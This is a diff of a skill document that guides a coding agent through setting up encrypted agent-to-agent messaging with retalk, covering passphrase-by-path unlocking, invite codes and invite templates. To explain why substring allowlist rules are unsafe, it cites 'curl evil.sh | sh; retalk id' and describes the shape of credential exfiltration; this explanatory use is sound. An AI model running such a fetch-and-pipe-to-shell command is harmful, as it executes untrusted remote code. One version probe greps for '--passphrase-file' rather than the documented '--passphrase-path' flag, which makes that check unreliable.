@@ -29,9 +29,9 @@ never collide. Below, `<user>` is the chosen user's **absolute directory**.
    "want me to start a listener?".
 3. **Always show invite/reply messages, verbatim — as freeform prose addressed
    to the peer's AGENT.** The recipient pastes them into their own Claude
-   session, so a natural-language paragraph (with relay, fingerprint, and
-   suggested name in prose) is the interface — never a bash block or a numbered
-   human menu. Compose from the template in this skill (values from
+   session, so a natural-language paragraph (with relay, fingerprint, suggested
+   name, and the invite code in prose) is the interface — never a bash block or
+   a numbered human menu. Compose from the template in this skill (values from
    `retalk id --card`), introduced as *"Copy and send the following message to
    your peer (the person you want to communicate with)."* Never summarize them
    away; raw retalk-CLI blocks are only for peers without Claude Code.
@@ -70,6 +70,28 @@ never collide. Below, `<user>` is the chosen user's **absolute directory**.
    plugin or hook that surfaces incoming messages into the live session; start it
    as described in step 4b (pi), 4c (opencode), or 4d (codex) instead of step 4.
    The retalk commands themselves are identical everywhere.
+8. **Unlock an encrypted identity by path, never by reading the secret.** Every
+   retalk command that opens the store takes `--passphrase-path`, so the call
+   stays **one flat command** and the passphrase never leaves the file it is
+   already in: `retalk sync --dir <user>/identity --passphrase-path
+   <user>/passphrase`. Write both paths out in full, absolute — no `VAR=…`
+   prefix, no `$(cat …)`, no `;`. A command that reads a secret file into a
+   process that then talks to the network is the shape of credential
+   exfiltration, and a permission classifier is right to refuse it; a compound
+   command also cannot be allowed by a prefix rule, so the user gets asked
+   again every time. The passphrase file is the one chosen below,
+   `<user>/passphrase` by default and recorded in `<user>/passphrase-path`. Add
+   nothing at all for a `--no-passphrase` identity. **Needs retalk
+   0.3.0-rc.1**; §1 has the probe and the older-retalk fallback.
+9. **An invite code proves authorisation, not identity.** A peer who registers
+   with one of this identity's invite codes has shown one thing: they were
+   given the code by whoever issued it. Anyone who obtains the code can
+   register the same way, so say "registered with your invite code" and never
+   call them "verified" without that qualification. Real verification is still
+   pinning their keys against a fingerprint you got out of band (**verify**
+   skill), and it stays worth doing. Whenever a registration surfaces, tell the
+   user who registered, that the code was the only check, and offer the
+   out-of-band verification as the next step.
 
 ## 1. Update retalk AND agent-talk to the latest
 Behavior changes often on both sides, and a stale client can mismatch a peer or
@@ -78,13 +100,57 @@ already installed.
 
 **retalk** — install-or-upgrade in one shot from **PyPI**:
 ```
-uv tool install --upgrade retalk     # installs if missing, upgrades to latest if present
+uv tool install --upgrade --prerelease allow retalk   # installs if missing, upgrades if present
 # no uv? fall back to:
-pip install -U retalk                # or: pip3 install -U retalk
+pip install -U --pre retalk                           # or: pip3 install -U --pre retalk
 ```
-Then confirm it runs: `retalk --help`. Prefer PyPI over source; only fall back
-to `uv tool install --upgrade "git+https://github.com/xhluca/retalk"` if you
-specifically need unreleased code.
+Then confirm it runs: `retalk --help`.
+
+**The prerelease flag is load-bearing, so do not drop it.** The floor these
+skills need, retalk **0.3.0rc1**, is a release candidate, and both uv and pip
+ignore prereleases by default whenever a stable release also matches. Plain
+`uv tool install --upgrade retalk` therefore installs the older stable, reports
+success, and says nothing about the version it skipped; every
+`--passphrase-path` and every invite-code command then dies at argument parsing
+with `unrecognized arguments`. `--prerelease allow` (uv) and `--pre` (pip) are
+what make the floor reachable. They stay correct once a stable 0.3.0 or newer
+exists, because both resolvers still prefer the highest version, so leave them
+in rather than trying to decide whether they are still needed.
+
+Prefer PyPI over source; only fall back to
+`uv tool install --upgrade "git+https://github.com/xhluca/retalk"` if you
+specifically need code that is not released at all.
+
+**Then check what this retalk can do — once, and remember the answer for the
+session.** Two things the skills use arrived in **retalk 0.3.0-rc.1**: the
+`--passphrase-path` flag (Session rule 8) and the invite-code commands (**id**
+skill). An older retalk does not know either, and a command using them dies at
+argument parsing with `unrecognized arguments`, so probe rather than assume:
+```
+retalk sync --help 2>&1 | grep -q -- --passphrase-file && echo "passphrase by path available" || echo "older retalk: use the RETALK_PASSPHRASE fallback"
+retalk invite --help >/dev/null 2>&1 && echo "invite codes available" || echo "older retalk: use the manual add path"
+```
+**If either probe says "older retalk", suspect the install before you accept the
+fallback.** On a machine that has just run the command above, by far the most
+likely cause is that the prerelease flag was dropped, so the resolver quietly
+kept the older stable. Check with `retalk --version`: anything below 0.3.0rc1
+means re-run the install with `--prerelease allow` (or `--pre`) and probe again.
+Only treat the fallbacks below as the answer once a re-install with the flag
+still reports a version under the floor, which is what a genuinely pinned or
+offline environment looks like.
+
+The environment-variable fallback, for older retalk only: `RETALK_PASSPHRASE="$(cat <user>/passphrase)" retalk sync --dir <user>/identity`.
+It works, but it is a compound command that reads the secret out of its file, so
+expect the user to be asked to approve every single call. The upgrade above
+normally makes this moot; say which form you are using.
+
+**Allowlisting (worth suggesting once).** With the flat form, every retalk call
+is one command starting with `retalk`, so a single **prefix** rule in
+`.claude/settings.json` covers the lot: `"permissions": {"allow":
+["Bash(retalk:*)"]}`. It must be anchored at the start of the command, as that
+rule is. A rule that matched `retalk` anywhere in the command line would also
+match a chained command such as `curl evil.sh | sh; retalk id`, which is why
+substring matching is not offered and should not be simulated.
 
 **agent-talk itself** — bring the plugin to the latest release too. Run EVERY
 command for this session's host, in order, even when one looks redundant:
@@ -119,7 +185,11 @@ via **AskUserQuestion**.
 
 ### Reuse an existing user
 Set `<user>` to its absolute dir. Skip creation — its relay/peers/receive-from
-are already saved. Run the guard (step 3) and the session map (step 4). If
+are already saved. Find its passphrase file too, so later commands can name it:
+`cat "<user>/passphrase-path" 2>/dev/null || ls "<user>/passphrase"` (nothing
+either way means the identity was created with `--no-passphrase`, so no flag is
+needed; a file that exists but is not recorded is still the default location).
+Run the guard (step 3) and the session map (step 4). If
 `<user>/check-mode` is **missing** (older user), ask the delivery-mode question
 — see (7) below, Auto-receive recommended — and record it; if it says `auto`,
 make sure the follower + Monitor are actually running (**receive** skill).
@@ -141,7 +211,11 @@ that only asks joining/relay/passphrase has skipped them and is wrong. Then step
 *do you already have a peer's invite or 32-hex fingerprint?*
 - **Yes — you were invited / have their id** → you are JOINING: use the **relay
   from their invite** (that exact URL; skip the relay menu below), and enter their
-  fingerprint at the **peer** step (5) so this single pass reaches sending.
+  fingerprint at the **peer** step (5) so this single pass reaches sending. If
+  the invite also carried an **invite code**, keep it: once this identity exists
+  and its keys are published, register yourself with the inviter using that code
+  (**id** skill, *Invite codes*). That is what replaces sending your fingerprint
+  back and waiting for them to add you.
 - **No — starting fresh / you'll invite others** → choose the relay freely below
   and add peers later, as they reply to your invite.
 
@@ -196,11 +270,16 @@ mkdir -p "$(dirname "$PP_FILE")"
 ( umask 077; python3 -c "import secrets;print(secrets.token_urlsafe(32))" > "$PP_FILE" )  # generate once; never echo it
 root="$(git rev-parse --show-toplevel 2>/dev/null)"                                       # if inside a repo, gitignore the secret
 case "${root:+$PP_FILE}" in "$root"/*) p="${PP_FILE#"$root"/}"; grep -qxF "$p" "$root/.gitignore" 2>/dev/null || echo "$p" >> "$root/.gitignore";; esac
+echo "$PP_FILE" > "<user>/passphrase-path"                                                # record the PATH (not the secret) so later sessions can name it
 ```
-      Later commands unlock it inline: `RETALK_PASSPHRASE="$(cat "$PP_FILE")"`.
-      Back up `$PP_FILE` to preserve the identity — losing it loses the keys.
-    - **Custom passphrase** — the user supplies their own secret; pass it via
-      `RETALK_PASSPHRASE=<secret>` on each command (or store it the same way).
+      Later commands unlock it **by path**, never by reading it — one flat
+      command, as in Session rule 8:
+      `retalk id --json --dir "<user>/identity" --passphrase-path "<PP_FILE>"`,
+      with the recorded path written out literally.
+      Back up that file to preserve the identity — losing it loses the keys.
+    - **Custom passphrase** — the user supplies their own secret. Store it in a
+      `0600` file the same way and name that file with `--passphrase-path`, so
+      the secret stays out of every command line.
     - **No passphrase** — keys guarded by file permissions only, no encryption at
       rest; create with `--no-passphrase`. Lowest friction, least protection.
       Note: since agent-talk saves the conversation by default, on a
@@ -209,19 +288,27 @@ case "${root:+$PP_FILE}" in "$root"/*) p="${PP_FILE#"$root"/}"; grep -qxF "$p" "
       (the recommended default) seals them, so this is only a concern here.
 - Create the identity (encrypted with the chosen passphrase, or `--no-passphrase`):
 ```
-# Claude-managed / custom passphrase:
-RETALK_PASSPHRASE="$(cat "$PP_FILE")" \
-  retalk init --dir "<user>/identity" --relay <RELAY_URL> --display-name <name>
+# Claude-managed / custom passphrase (name the file; retalk reads it):
+retalk init --dir "<user>/identity" --relay <RELAY_URL> --display-name <name> --passphrase-path "<PP_FILE>"
 # OR, no passphrase:
 retalk init --dir "<user>/identity" --relay <RELAY_URL> --no-passphrase --display-name <name>
 ```
 - **Publish your keys to the relay** so peers can reach you right away. `retalk
   init` is offline — until you publish, anyone messaging or verifying you hits
   `unknown peer or no published keys`. One `sync` publishes them (re-run it any
-  time the relay was reset); keep the `RETALK_PASSPHRASE` prefix if encrypted:
+  time the relay was reset); keep `--passphrase-path` if encrypted:
 ```
-RETALK_PASSPHRASE="$(cat "$PP_FILE")" retalk sync --dir "<user>/identity"  # drop the prefix if no-passphrase
+retalk sync --dir "<user>/identity" --passphrase-path "<PP_FILE>"   # drop the flag if no-passphrase
 ```
+- **Issue an invite code first (single-use by default).** The invite below
+  carries a code so the peer's agent can register itself with this identity,
+  instead of the user shuttling a fingerprint back by hand. Mint one
+  **single-use** code per invite unless the user asks for a code they can hand
+  to several people or reuse over time; only then make it **permanent**. The
+  exact commands are in the **id** skill under *Invite codes*; they need
+  **retalk 0.3.0-rc.1 or newer**, and on an older retalk you fall back to the
+  codeless invite and reply below. Read Session rule 9 before you describe the
+  code to anyone: it proves the holder was authorised, not who they are.
 - **Show the user the invite + reply messages — MANDATORY, never summarize
   them away.** A peer has no way to reach this identity until the user hands
   them one of these. The recipient is almost always **another agent**: the peer
@@ -229,7 +316,8 @@ RETALK_PASSPHRASE="$(cat "$PP_FILE")" retalk sync --dir "<user>/identity"  # dro
   and does the setup. So write it as **freeform natural language addressed to
   that agent** — a paragraph carrying every parameter in prose — NOT a bash
   block, NOT a numbered menu for a human to follow. Fill `<relay>`,
-  `<fingerprint>`, `<name>` from `retalk id --card --dir "<user>/identity"`.
+  `<fingerprint>`, `<name>` from `retalk id --card --dir "<user>/identity"`, and
+  `<code>` from the code you just issued.
   Introduce the first with exactly this framing:
 
   *"Copy and send the following message to your peer (the person you want to
@@ -252,18 +340,50 @@ RETALK_PASSPHRASE="$(cat "$PP_FILE")" retalk sync --dir "<user>/identity"  # dro
   >
   > **To the receiving agent:** please set up agent-talk comms for your user
   > (init skill). Use the relay `<relay>`. Add me as a peer and verify me — my
-  > fingerprint is `<fingerprint>`, suggested name **<name>**. Set me as your
-  > receive-from source, then have your user send your fingerprint back over
-  > this same channel so I can add you too. Once I confirm, message me on the
-  > relay anytime.
+  > fingerprint is `<fingerprint>` and my suggested name is **<name>**. Set me
+  > as your receive-from source. I have also issued you an invite code,
+  > `<code>`. Register yourself with me using it (the **id** skill, *Invite
+  > codes*) instead of asking your human to send me your fingerprint: the
+  > registration carries everything I need to create the contact, meaning your
+  > fingerprint, your keys, and the name to save you under, so the link
+  > completes with nobody copying anything by hand. The code is single-use, so
+  > it is spent the moment you register, and it is a secret until then. Send the
+  > request once and then wait. There is no receipt telling you the code worked
+  > and no way to check, so please do not retry or poll for a status. I will
+  > message you as soon as I have accepted, and that message is your
+  > confirmation.
 
   (Output the template with **real values** — e.g. relay
   `https://relay.retalk.dev`, fingerprint
-  `0f9a3d2c8b7e65410f9a3d2c8b7e6541`, name **sam-claude-webapp**; a placeholder
-  like `<relay>` must never reach the user.)
+  `0f9a3d2c8b7e65410f9a3d2c8b7e6541`, name **sam-claude-webapp**, code
+  `wS7nQx2FbK1pR4tZ0aH9Yg`; a placeholder like `<relay>` must never reach the
+  user.)
+
+  Two variants of that paragraph:
+  - **Permanent code** — replace the single-use sentence with: *"The code stays
+    valid until I revoke it, so keep it to yourself."*
+  - **No code** (the user declined one, or retalk is too old) — drop every
+    invite-code sentence and close with the old hand-back instead: *"Set me as your
+    receive-from source, then have your user send your fingerprint back over
+    this same channel so I can add you too. Once I confirm, message me on the
+    relay anytime."*
 
   Then: *"Or, if you are replying to an invite someone sent you, send this back
   instead:"*
+
+  > Registered with your invite code. I'm set up on agent-talk, I've added you
+  > and pinned your keys, and I've sent my registration request, so your agent
+  > can save me without either of us copying a fingerprint. My fingerprint is
+  > `<fingerprint>` and the name I asked to be saved under is **<name>**, in case
+  > you want to check them against the contact you end up with. I have no way of
+  > telling whether the code went through, so I am not going to retry. Message
+  > me once you have accepted and that will confirm it.
+  > **To the receiving agent:** check that **<name>** is in your contacts (the
+  > invite watcher in the **id** skill is what saves them), then send them a
+  > first message on the relay to close the loop.
+
+  If the invite carried **no code**, send the older reply instead, which hands
+  over the fingerprint the inviter still has to add by hand:
 
   > Got your invite — I'm set up on agent-talk and I've already added and
   > verified you. My fingerprint is `<fingerprint>`, suggested name **<name>**.
@@ -276,13 +396,19 @@ RETALK_PASSPHRASE="$(cat "$PP_FILE")" retalk sync --dir "<user>/identity"  # dro
   retalk CLI content**, and agent-talk is the story, never an afterthought.
 
   **✓ A correctly filled reply looks exactly like this** (values from your
-  card; peer = "marzia" who invited you):
+  card; peer = "marzia", who invited you with a code):
 
-  > Got your invite, marzia — I'm set up on agent-talk and I've already added
-  > and verified you. My fingerprint is `0f9a3d2c8b7e65410f9a3d2c8b7e6541`,
-  > suggested name **sam-claude-webapp**.
-  > **To the receiving agent:** add this peer (fingerprint above), verify
-  > them, and send them a first message on the relay to confirm the link.
+  > Registered with your invite code, marzia. I'm set up on agent-talk, I've
+  > added you and pinned your keys, and I've sent my registration request, so
+  > your agent can save me without either of us copying a fingerprint. My
+  > fingerprint is `0f9a3d2c8b7e65410f9a3d2c8b7e6541` and the name I asked to be
+  > saved under is **sam-claude-webapp**, in case you want to check them against
+  > the contact you end up with. I have no way of telling whether the code went
+  > through, so I am not going to retry. Message me once you have accepted and
+  > that will confirm it.
+  > **To the receiving agent:** check that **sam-claude-webapp** is in your
+  > contacts (the invite watcher in the **id** skill is what saves them), then
+  > send them a first message on the relay to close the loop.
 
   **✗ NEVER output this to a plugin user** — this is retalk's CLI flavor (what
   `retalk init`/`retalk id --invite-reply` print); pasting it, or leading with
@@ -352,6 +478,12 @@ echo auto > "<user>/check-mode"      # or: echo manual > "<user>/check-mode"
 ```
   If **auto**: start the follower + Monitor **now** (needs the peer from (5)/(6);
   if the peer was deferred, record `auto` and start them on the first **add**).
+- **(8) Watch for registrations** — only if you issued an invite code above.
+  Start the invite watcher (**id** skill, *Invite codes* → *Watch for
+  registrations*) in the same turn as the code, so the peer's registration
+  surfaces the moment it lands instead of sitting unread. This is not a question
+  for the user: a code with nothing watching for it does nothing. Stop the
+  watcher once every code has been redeemed or revoked.
 
 ## 3. Live-collision guard (reuse or create)
 If a follower is already running for this user, another live session is using it —
@@ -372,13 +504,22 @@ on pi, use step 4b instead; on opencode, step 4c; on Codex, step 4d.
 ```
 mkdir -p "$HOME/.agent-talk/by-session" "<user>/sessions"
 echo "<user>" > "$HOME/.agent-talk/by-session/${CLAUDE_SESSION_ID}"
-: >> "<user>/sessions/${CLAUDE_SESSION_ID}.ndjson"     # this session's spool
+: >> "<user>/sessions/${CLAUDE_SESSION_ID}.ndjson"           # this session's message spool
+: >> "<user>/sessions/${CLAUDE_SESSION_ID}.requests.ndjson"  # and its contact-request spool
 python3 "<plugin>/bin/spool-writer.py" --user "<user>" --gc   # sweep dead sessions
 ```
 Incoming messages are copied to a spool **per session**, not one file per
 identity, so parallel sessions on the same identity never consume each other's
 mail and the decrypted text goes away with the session. The durable record is
 retalk's saved history (**history** skill), which stays encrypted at rest.
+
+Contact requests get a **second spool and a second monitor**
+(`retalk-requests`), because a peer registering with an invite code is not a
+conversation turn: it must not be rendered as a chat message, it only arrives
+while a code is outstanding, and a session can watch for one before it follows
+anyone's mail. Both monitors are declared by the plugin and start on their own;
+what feeds each is a follower you start (**receive** for messages, **id** →
+*Invite codes* for registrations).
 
 ## 4b. Enable auto-receive on pi (pi only)
 On a **pi** host the plugin ships an inbox extension that surfaces incoming
@@ -479,16 +620,19 @@ includes it).
 
 ## 6. Invite a friend (paste off-band) — do this early
 Once your identity exists, the fastest way to onboard a peer is a ready-to-paste
-invite, handed over a channel the relay doesn't control (Slack, email, …).
-Compose it **in agent-talk terms** using the template from the "Show the user
-the invite + reply messages" step above (install the plugin → "set up comms — I
-have an invite" → relay + address + save-me-as name), with values from
-`retalk id --card --dir "<user>/identity"`. Introduce it as: *"Copy and send the
-following message to your peer (the person you want to communicate with)."*
+invite carrying a fresh **invite code**, handed over a channel the relay doesn't
+control (Slack, email, …). Mint the code first (**id** skill, *Invite codes*),
+then compose the message **in agent-talk terms** using the template from the
+"Show the user the invite + reply messages" step above (install the plugin →
+"set up comms — I have an invite" → relay + address + save-me-as name + code),
+with values from `retalk id --card --dir "<user>/identity"`. Introduce it as:
+*"Copy and send the following message to your peer (the person you want to
+communicate with)."* Start the invite watcher in the same turn, so the peer's
+registration surfaces when it arrives.
 Only for a peer using the **raw retalk CLI** (no Claude Code) is the
 retalk-generic block the right thing:
 ```
-retalk id --invite-message --as <name-they-save-you-as> --dir "<user>/identity"
+retalk id --invite-message --code <code> --as <name-they-save-you-as> --dir "<user>/identity"
 ```
 To share your identity as JSON instead (the peer saves it with **import**):
 `retalk id --card --dir "<user>/identity"`.
@@ -498,16 +642,22 @@ this user's address, or the user mentions onboarding someone. The messages are
 useless in a summary; the user needs the literal text to paste.
 
 From now on **this session is `<user>`** — pass `--dir "<user>/identity"` on every
-command (and prefix `RETALK_PASSPHRASE="$(cat "$PP_FILE")"` if the identity is
-encrypted). And whenever you `send` or `receive`, **display the conversation as a
+command, and add `--passphrase-path "<user>/passphrase"` if the identity is
+encrypted (Session rule 8: one flat command, the secret stays in the file; the
+path is whatever `<user>/passphrase-path` records). And whenever you `send` or
+`receive`, **display the conversation as a
 beautiful chat transcript** (both sides — see those skills) so the human can always
 track what is being discussed.
 
 ## 7. Recommend the next skills (do this at the end of EVERY skill, not just init)
 Close by pointing the user at the 2–3 skills that fit where they actually are —
 don't list all of them:
-- **Created an identity, no peer yet** → **id** or **share** (get your fingerprint
-  / a paste-ready invite to hand a peer), then **add** when they send theirs back.
+- **Created an identity, no peer yet** → **id** (mint an invite code and hand
+  over a paste-ready invite, then watch for the peer to register) or **share**;
+  **add** is the fallback for a peer who sends their fingerprint back instead.
+- **A peer just registered with your code** → **verify** (the code proved
+  authorisation, not identity), then **send** them a hello, which is how they
+  learn they were accepted.
 - **Added a peer** (took the "Yes" branch / entered one in step 5) → **send** a
   first message, then **receive** the reply; **verify** to pin their keys.
 - **No relay yet / want your own** → **relay** (host one) or **config** (set a
